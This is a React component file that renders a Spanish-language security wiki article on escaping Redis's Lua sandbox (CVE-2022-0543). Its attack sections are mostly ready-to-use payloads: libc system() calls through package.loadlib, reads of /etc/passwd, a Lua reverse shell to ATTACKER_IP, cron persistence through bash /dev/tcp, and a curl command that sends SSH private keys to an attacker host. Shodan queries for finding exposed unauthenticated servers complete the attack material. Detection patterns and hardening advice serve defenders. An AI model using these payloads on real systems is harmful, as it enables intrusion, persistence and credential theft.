/**
 * REDIS RCE VIA LUA SANDBOXING
 * Escapar del sandbox de Lua para ejecutar comandos del sistema
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Terminal, Shield, Code2, Zap, ArrowRight, AlertTriangle } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function RedisRCEContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="Redis y el Peligro de Eval">
        <Paragraph>
          Redis, la popular base de datos en memoria, permite ejecutar <Strong>scripts Lua</Strong> mediante 
          el comando <InlineCode>EVAL</InlineCode>. Aunque Lua está "sandboxeado" para seguridad, 
          existen múltiples formas de <Strong>escapar del sandbox</Strong> y ejecutar comandos del sistema.
        </Paragraph>

        <AlertDanger title="Impacto Crítico">
          Un atacante que logre escapar del sandbox Lua puede:
          <ul className="mt-2 space-y-1">
            <ListItem>Ejecutar comandos shell arbitrarios (RCE)</ListItem>
            <ListItem>Leer/escribir archivos del sistema</ListItem>
            <ListItem>Escalar privilegios si Redis corre como root</ListItem>
            <ListItem>Pivotar a otros servicios internos</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="sandbox-lua" title="1. El Sandbox de Lua en Redis">
        <Subsection title="¿Qué está Permitido?">
          <Paragraph>
            Por defecto, Redis deshabilita funciones peligrosas de Lua:
          </Paragraph>

          <CodeBlock
            language="lua"
            title="Funciones bloqueadas"
            code={`-- ❌ Bloqueadas por defecto
os.execute()     -- Ejecutar comandos shell
io.open()        -- Abrir archivos
require()        -- Cargar módulos externos
loadfile()       -- Cargar código desde archivo
dofile()         -- Ejecutar archivo Lua`}
          />
        </Subsection>

        <Subsection title="Script Lua Básico en Redis">
          <CodeBlock
            language="bash"
            title="Ejemplo legítimo"
            code={`redis-cli EVAL "return redis.call('GET', 'mykey')" 0

# Incrementar contador atómicamente
redis-cli EVAL "local val = redis.call('GET', KEYS[1]) or 0; redis.call('SET', KEYS[1], val+1); return val+1" 1 counter`}
          />
        </Subsection>
      </Section>

      <Section id="bypass-sandbox" title="2. Bypass del Sandbox">
        <Subsection title="Técnica 1: Package.loadlib (CVE-2022-0543)">
          <Paragraph>
            En versiones vulnerables, <InlineCode>package.loadlib</InlineCode> permite cargar librerías nativas:
          </Paragraph>

          <CodeBlock
            language="lua"
            title="Payload - Cargar librería maliciosa"
            code={`-- Cargar libc.so para acceder a system()
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/libc.so.6", "system")
io_l("id > /tmp/pwned.txt")`}
          />

          <TerminalOutput title="Ejecución en Redis">
            {`redis-cli EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/libc.so.6","system"); io_l("whoami > /tmp/output.txt")' 0

# Verificar
cat /tmp/output.txt
# redis`}
          </TerminalOutput>

          <AlertWarning title="Versiones Afectadas">
            Redis <InlineCode>&lt; 6.2.7</InlineCode> y <InlineCode>&lt; 7.0</InlineCode> con 
            Debian packages que incluyen librería LuaJIT vulnerable.
          </AlertWarning>
        </Subsection>

        <Subsection title="Técnica 2: Debug Library Abuse">
          <CodeBlock
            language="lua"
            title="Payload - Usar debug.getregistry()"
            code={`-- Acceder al registro de Lua para restaurar funciones bloqueadas
local dbg = debug.getregistry()
local io = dbg.io
local file = io.open("/etc/passwd", "r")
local content = file:read("*all")
file:close()
return content`}
          />
        </Subsection>

        <Subsection title="Técnica 3: Metatable Manipulation">
          <CodeBlock
            language="lua"
            title="Payload - Modificar metatables"
            code={`-- Manipular metatables para acceder a funciones protegidas
local mt = getmetatable(_G)
if mt then
    local __index = mt.__index
    local os = __index.os
    return os.execute("cat /etc/passwd")
end`}
          />
        </Subsection>
      </Section>

      <Section id="explotacion-completa" title="3. Explotación Completa">
        <Subsection title="Reverse Shell con Lua">
          <CodeBlock
            language="lua"
            title="Payload - Reverse Shell"
            code={`-- Cargar socket library y conectar a atacante
local socket = package.loadlib("/usr/lib/lua/5.1/socket/core.so", "luaopen_socket_core")()
local tcp = socket.tcp()
tcp:connect("ATTACKER_IP", 4444)

while true do
    local cmd, err = tcp:receive()
    if not cmd then break end
    
    local io_l = package.loadlib("/lib/x86_64-linux-gnu/libc.so.6", "system")
    io_l(cmd)
end`}
          />

          <TerminalOutput title="Listener en máquina atacante">
            {`nc -lvnp 4444

# Al recibir conexión, puedes ejecutar comandos:
whoami
id
cat /etc/redis/redis.conf`}
          </TerminalOutput>
        </Subsection>

        <Subsection title="Escribir Cron Job Malicioso">
          <CodeBlock
            language="lua"
            title="Payload - Persistencia vía cron"
            code={`-- Escribir cronjob para reverse shell persistente
local io_l = package.loadlib("/lib/x86_64-linux-gnu/libc.so.6", "system")
io_l("echo '* * * * * /bin/bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"' | crontab -")`}
          />
        </Subsection>

        <Subsection title="Robo de Claves SSH">
          <CodeBlock
            language="lua"
            title="Payload - Exfiltrar SSH keys"
            code={`local io_l = package.loadlib("/lib/x86_64-linux-gnu/libc.so.6", "system")
io_l("cat ~/.ssh/id_rsa | curl -X POST -d @- http://ATTACKER_IP:8000/exfil")`}
          />
        </Subsection>
      </Section>

      <Section id="deteccion" title="4. Detección de Explotación">
        <Subsection title="Monitorear Comandos EVAL">
          <CodeBlock
            language="bash"
            title="Log analysis con grep"
            code={`# Revisar logs de Redis
grep "EVAL" /var/log/redis/redis-server.log

# Buscar patrones sospechosos
grep -E "(package\.loadlib|debug\.getregistry|os\.execute)" /var/log/redis/redis-server.log`}
          />
        </Subsection>

        <Subsection title="Monitor en Tiempo Real">
          <CodeBlock
            language="bash"
            title="Usar MONITOR de Redis"
            code={`redis-cli MONITOR | grep -i "eval"

# Salida sospechosa:
# EVAL "local io_l = package.loadlib..." 0`}
          />
        </Subsection>

        <AlertInfo title="Indicadores de Compromiso (IOCs)">
          <ul className="mt-2 space-y-1">
            <ListItem>Comandos EVAL con <InlineCode>package.loadlib</InlineCode></ListItem>
            <ListItem>Conexiones de red inesperadas desde proceso Redis</ListItem>
            <ListItem>Archivos creados en <InlineCode>/tmp/</InlineCode> o <InlineCode>/var/tmp/</InlineCode></ListItem>
            <ListItem>Cambios en crontabs de usuario redis</ListItem>
          </ul>
        </AlertInfo>
      </Section>

      <Section id="mitigacion" title="Mitigación y Hardening">
        <AlertDanger title="Mejores Prácticas de Seguridad">
          <ul className="space-y-3 mt-3">
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Actualizar Redis:</Strong> Usar versión ≥ 6.2.7 o ≥ 7.0 (parchan CVE-2022-0543)
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Deshabilitar EVAL:</Strong> Renombrar comando EVAL en redis.conf
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Firewall:</Strong> Redis NO debe estar expuesto a Internet
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Autenticación:</Strong> Siempre usar <InlineCode>requirepass</InlineCode>
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Usuario No-Root:</Strong> Nunca correr Redis como root
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>AppArmor/SELinux:</Strong> Restringir capacidades del proceso
            </ListItem>
          </ul>
        </AlertDanger>

        <CodeBlock
          language="conf"
          title="redis.conf - Configuración segura"
          code={`# Deshabilitar comandos peligrosos
rename-command EVAL ""
rename-command SCRIPT ""
rename-command CONFIG ""
rename-command SHUTDOWN ""
rename-command FLUSHALL ""

# Autenticación fuerte
requirepass TuPasswordSeguraAqui123!

# Bind solo a localhost
bind 127.0.0.1 ::1

# Deshabilitar protected mode SOLO si usas firewall
protected-mode yes

# Límite de memoria
maxmemory 256mb
maxmemory-policy allkeys-lru`}
        />

        <CodeBlock
          language="bash"
          title="AppArmor profile restrictivo"
          code={`# /etc/apparmor.d/usr.bin.redis-server
#include <tunables/global>

/usr/bin/redis-server {
  #include <abstractions/base>
  
  # Permitir solo archivos necesarios
  /var/lib/redis/** rw,
  /var/log/redis/** w,
  /etc/redis/** r,
  
  # Bloquear ejecución de binarios
  deny /bin/** x,
  deny /usr/bin/** x,
  deny /sbin/** x,
  
  # Bloquear acceso a archivos sensibles
  deny /etc/passwd r,
  deny /etc/shadow r,
  deny /root/** rw,
}`}
        />
      </Section>

      <Section id="shodan" title="5. Hunting en Shodan">
        <CodeBlock
          language="text"
          title="Queries para encontrar Redis expuestos"
          code={`product:"Redis" port:6379

# Redis sin autenticación
"redis_version" -"Authentication required"

# Redis con EVAL habilitado
"redis_version" "eval"`}
        />

        <AlertWarning>
          Encontrar instancias Redis expuestas en Shodan es trivial. Miles de servidores 
          vulnerables están accesibles públicamente sin autenticación.
        </AlertWarning>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Cassandra Injection</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/cassandra-injection`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Cassandra CQL Injection</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
